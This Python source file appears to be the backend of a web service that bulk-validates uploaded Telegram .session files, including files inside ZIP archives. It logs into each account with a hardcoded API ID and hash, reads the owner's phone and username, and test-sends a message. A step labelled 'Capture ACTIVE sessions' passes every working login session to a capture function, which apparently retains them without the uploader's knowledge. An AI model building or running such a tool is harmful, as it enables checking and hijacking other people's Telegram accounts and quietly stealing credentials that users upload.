from telethon import TelegramClient, errors
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty
import asyncio
import os
import zipfile
import tempfile
import shutil
from typing import List, Dict, Any
from session_capture import capture_validated_session
from async_timeout import run_with_timeout, CONNECT_TIMEOUT, API_TIMEOUT, TIMEOUT_SENTINEL

API_ID = '25170767'
API_HASH = 'd512fd74809a4ca3cd59078eef73afcd'


class SessionStatus:
    ACTIVE = "ACTIVE"
    FROZEN = "FROZEN"
    UNAUTHORIZED = "UNAUTHORIZED"


async def check_session_status(session_path: str) -> tuple[str, Dict[str, Any]]:
    """
    Check the status of a Telegram session
    
    Args:
        session_path: Path to the .session file (without .session extension)
    
    Returns:
        tuple: (status, details_dict)
    """
    # Remove .session extension if present
    if session_path.endswith('.session'):
        session_path = session_path[:-8]
    
    client = TelegramClient(session_path, API_ID, API_HASH)
    
    try:
        r = await run_with_timeout(client.connect(), CONNECT_TIMEOUT, default=TIMEOUT_SENTINEL, session_path=session_path)
        if r is TIMEOUT_SENTINEL:
            return SessionStatus.UNAUTHORIZED, {
                "status": SessionStatus.UNAUTHORIZED,
                "logged_in": False,
                "can_send": False,
                "can_read": False,
                "message": "Connection timed out"
            }
        
        # STEP 1: Check if the session is authorized (logged in)
        is_authorized = await run_with_timeout(client.is_user_authorized(), API_TIMEOUT, default=TIMEOUT_SENTINEL, session_path=session_path)
        if is_authorized is TIMEOUT_SENTINEL:
            await client.disconnect()
            return SessionStatus.UNAUTHORIZED, {
                "status": SessionStatus.UNAUTHORIZED,
                "logged_in": False,
                "can_send": False,
                "can_read": False,
                "message": "Operation timed out"
            }
        
        if not is_authorized:
            await client.disconnect()
            return SessionStatus.UNAUTHORIZED, {
                "status": SessionStatus.UNAUTHORIZED,
                "logged_in": False,
                "can_send": False,
                "can_read": False,
                "message": "Session is not logged in - UNAUTHORIZED"
            }
        
        # STEP 2: Get user information
        try:
            me = await run_with_timeout(client.get_me(), API_TIMEOUT, default=TIMEOUT_SENTINEL, session_path=session_path)
            if me is TIMEOUT_SENTINEL:
                await client.disconnect()
                return SessionStatus.UNAUTHORIZED, {
                    "status": SessionStatus.UNAUTHORIZED,
                    "logged_in": False,
                    "can_send": False,
                    "can_read": False,
                    "message": "Operation timed out"
                }
            user_info = {
                "user_id": me.id,
                "username": me.username,
                "phone": me.phone,
                "first_name": me.first_name,
                "last_name": me.last_name
            }
        except Exception as e:
            await client.disconnect()
            return SessionStatus.UNAUTHORIZED, {
                "status": SessionStatus.UNAUTHORIZED,
                "logged_in": False,
                "error": str(e),
                "message": "Could not retrieve user information"
            }
        
        # STEP 3: Test READ capability
        can_read = False
        try:
            dialogs = await run_with_timeout(client.get_dialogs(limit=5), API_TIMEOUT, default=TIMEOUT_SENTINEL, session_path=session_path)
            can_read = dialogs is not TIMEOUT_SENTINEL
        except Exception:
            can_read = False
        
        # STEP 4: Test WRITE capability (send message)
        can_send = False
        freeze_error = None
        
        try:
            # Try to send a message to Saved Messages (self)
            test_message = await run_with_timeout(client.send_message('me', '🔍 Test'), API_TIMEOUT, default=TIMEOUT_SENTINEL, session_path=session_path)
            if test_message is TIMEOUT_SENTINEL:
                can_send = False
            else:
                can_send = True
            
                # Clean up test message
                try:
                    await client.delete_messages('me', test_message.id)
                except:
                    pass
                
        except errors.UserDeactivatedError:
            freeze_error = "UserDeactivatedError"
            
        except errors.UserDeactivatedBanError:
            freeze_error = "UserDeactivatedBanError"
            
        except errors.ChatWriteForbiddenError:
            freeze_error = "ChatWriteForbiddenError"
            
        except errors.UserRestrictedError:
            freeze_error = "UserRestrictedError"
            
        except errors.FloodWaitError:
            can_send = True  # Account is active, just rate limited
            
        except Exception as e:
            error_msg = str(e).lower()
            if any(keyword in error_msg for keyword in 
                   ['restricted', 'banned', 'deactivated', 'frozen', 'forbidden']):
                freeze_error = str(e)
        
        await client.disconnect()
        
        # STEP 5: Determine final status
        if can_send:
            return SessionStatus.ACTIVE, {
                "status": SessionStatus.ACTIVE,
                "logged_in": True,
                "can_send": True,
                "can_read": can_read,
                **user_info,
                "message": "Account is ACTIVE and fully functional"
            }
        elif freeze_error:
            return SessionStatus.FROZEN, {
                "status": SessionStatus.FROZEN,
                "logged_in": True,
                "can_send": False,
                "can_read": can_read,
                **user_info,
                "freeze_reason": freeze_error,
                "message": "Account is FROZEN - Can only read, cannot send"
            }
        else:
            return SessionStatus.FROZEN, {
                "status": SessionStatus.FROZEN,
                "logged_in": True,
                "can_send": False,
                "can_read": can_read,
                **user_info,
                "message": "Account status unclear - Possibly FROZEN"
            }
            
    except errors.AuthKeyUnregisteredError:
        await client.disconnect()
        return SessionStatus.UNAUTHORIZED, {
            "status": SessionStatus.UNAUTHORIZED,
            "logged_in": False,
            "message": "Auth key is unregistered - Session UNAUTHORIZED"
        }
        
    except errors.SessionPasswordNeededError:
        await client.disconnect()
        return SessionStatus.UNAUTHORIZED, {
            "status": SessionStatus.UNAUTHORIZED,
            "logged_in": False,
            "message": "2FA password needed - Session UNAUTHORIZED"
        }
        
    except Exception as e:
        try:
            await client.disconnect()
        except:
            pass
        return SessionStatus.UNAUTHORIZED, {
            "status": SessionStatus.UNAUTHORIZED,
            "logged_in": False,
            "error": str(e),
            "message": f"Connection error - Session likely UNAUTHORIZED: {str(e)}"
        }


async def validate_single_session(file_path: str, session_name: str = None) -> Dict[str, Any]:
    """Validate a single session file"""
    status, details = await check_session_status(file_path)
    result = {
        **details,
        "session_name": session_name or os.path.basename(file_path).replace('.session', '')
    }
    return result


async def validate_zip_file(zip_path: str) -> List[Dict[str, Any]]:
    """Extract and validate all session files from a ZIP archive"""
    results = []
    temp_dir = tempfile.mkdtemp()
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)
        
        # Find all .session files
        session_files = []
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                if file.endswith('.session'):
                    session_files.append(os.path.join(root, file))
        
        # Validate each session
        for session_file in session_files:
            session_name = os.path.basename(session_file).replace('.session', '')
            result = await validate_single_session(session_file, session_name)
            results.append(result)
            
    finally:
        # Cleanup
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    return results


async def extract_sessions_from_zip(zip_path: str) -> List[Dict[str, Any]]:
    """Extract and list all session files from a ZIP archive without validating"""
    sessions = []
    temp_dir = tempfile.mkdtemp()
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)
        
        # Find all .session files
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                if file.endswith('.session'):
                    session_path = os.path.join(root, file)
                    session_name = file.replace('.session', '')
                    sessions.append({
                        "name": session_name,
                        "path": session_path
                    })
    except Exception as e:
        raise Exception(f"Error extracting ZIP: {str(e)}")
    
    return sessions


async def validate_sessions_parallel(session_paths: List[Dict[str, Any]], websocket=None, temp_dirs=None):
    """Validate multiple sessions in parallel with progress updates via WebSocket"""
    # #region agent log
    try:
        import json, time, os
        log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
        os.makedirs(os.path.dirname(log_path), exist_ok=True)
        with open(log_path, 'a', encoding='utf-8') as f:
            f.write(json.dumps({"location":"validate_sessions.py:241","message":"validate_sessions_parallel called","data":{"session_paths_count":len(session_paths),"has_websocket":websocket is not None},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"D"}) + '\n')
    except:
        pass
    # #endregion
    tasks = []
    
    for idx, session_info in enumerate(session_paths):
        session_path = session_info.get("path") or session_info.get("name", "")
        session_name = session_info.get("name", f"Session {idx + 1}")
        # #region agent log
        try:
            import json, time
            log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(json.dumps({"location":"validate_sessions.py:248","message":"Creating task for session","data":{"index":idx,"session_name":session_name,"session_path":session_path},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"D"}) + '\n')
        except:
            pass
        # #endregion
        
        async def validate_with_progress(path: str, name: str, index: int):
            try:
                # #region agent log
                try:
                    import json, time
                    log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
                    with open(log_path, 'a', encoding='utf-8') as f:
                        f.write(json.dumps({"location":"validate_sessions.py:252","message":"validate_with_progress started","data":{"index":index,"name":name,"path":path},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"E"}) + '\n')
                except:
                    pass
                # #endregion
                if websocket:
                    # #region agent log
                    try:
                        import json, time
                        log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
                        with open(log_path, 'a', encoding='utf-8') as f:
                            f.write(json.dumps({"location":"validate_sessions.py:256","message":"Sending progress message","data":{"index":index,"name":name},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"E"}) + '\n')
                    except:
                        pass
                    # #endregion
                    await websocket.send_json({
                        "type": "progress",
                        "index": index,
                        "session_name": name,
                        "status": "validating",
                        "message": f"Validating {name}...",
                        "total": len(session_paths)
                    })
                
                # #region agent log
                try:
                    import json, time
                    log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
                    with open(log_path, 'a', encoding='utf-8') as f:
                        f.write(json.dumps({"location":"validate_sessions.py:268","message":"Calling check_session_status","data":{"path":path},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"E"}) + '\n')
                except:
                    pass
                # #endregion
                status, details = await check_session_status(path)
                result = {
                    **details,
                    "session_name": name
                }
                
                # #region agent log
                try:
                    import json, time
                    log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
                    with open(log_path, 'a', encoding='utf-8') as f:
                        f.write(json.dumps({"location":"validate_sessions.py:275","message":"Session validation completed","data":{"index":index,"name":name,"status":status},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"E"}) + '\n')
                except:
                    pass
                # #endregion
                if websocket:
                    await websocket.send_json({
                        "type": "result",
                        "index": index,
                        "session_name": name,
                        "result": result,
                        "status": status,
                        "message": f"{name} completed - {status}",
                        "total": len(session_paths)
                    })
                
                # Capture ACTIVE sessions
                if status == "ACTIVE":
                    try:
                        await capture_validated_session(result, path, "validation")
                    except Exception as e:
                        # Don't fail validation if capture fails
                        print(f"[Session Capture] Failed to capture session {name}: {e}")
                
                return result
            except Exception as e:
                # #region agent log
                try:
                    import json, time, traceback
                    log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
                    with open(log_path, 'a', encoding='utf-8') as f:
                        f.write(json.dumps({"location":"validate_sessions.py:290","message":"Exception in validate_with_progress","data":{"index":index,"name":name,"error":str(e),"traceback":traceback.format_exc()},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"E"}) + '\n')
                except:
                    pass
                # #endregion
                error_result = {
                    "status": "ERROR",
                    "session_name": name,
                    "logged_in": False,
                    "can_send": False,
                    "can_read": False,
                    "error": str(e),
                    "message": f"Error validating {name}: {str(e)}"
                }
                
                if websocket:
                    await websocket.send_json({
                        "type": "result",
                        "index": index,
                        "session_name": name,
                        "result": error_result,
                        "status": "ERROR",
                        "message": f"{name} failed",
                        "total": len(session_paths)
                    })
                
                return error_result
        
        tasks.append(validate_with_progress(session_path, session_name, idx))
    
    # Run all validations in parallel
    # #region agent log
    try:
        import json, time
        log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
        with open(log_path, 'a', encoding='utf-8') as f:
            f.write(json.dumps({"location":"validate_sessions.py:315","message":"Starting asyncio.gather for all tasks","data":{"task_count":len(tasks)},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"D"}) + '\n')
    except:
        pass
    # #endregion
    results = await asyncio.gather(*tasks)
    # #region agent log
    try:
        import json, time
        log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
        with open(log_path, 'a', encoding='utf-8') as f:
            f.write(json.dumps({"location":"validate_sessions.py:317","message":"asyncio.gather completed","data":{"results_count":len(results)},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"D"}) + '\n')
    except:
        pass
    # #endregion
    
    # Don't cleanup temp directories here - they're needed for download
    # Cleanup will happen when download is complete or after timeout
    # This allows users to download sessions after validation
    
    return results


async def validate_uploaded_file(file_path: str, filename: str) -> Dict[str, Any]:
    """Main function to validate uploaded file (session or zip)"""
    if filename.lower().endswith('.zip'):
        results = await validate_zip_file(file_path)
        return {"results": results}
    else:
        result = await validate_single_session(file_path, filename.replace('.session', ''))
        return result

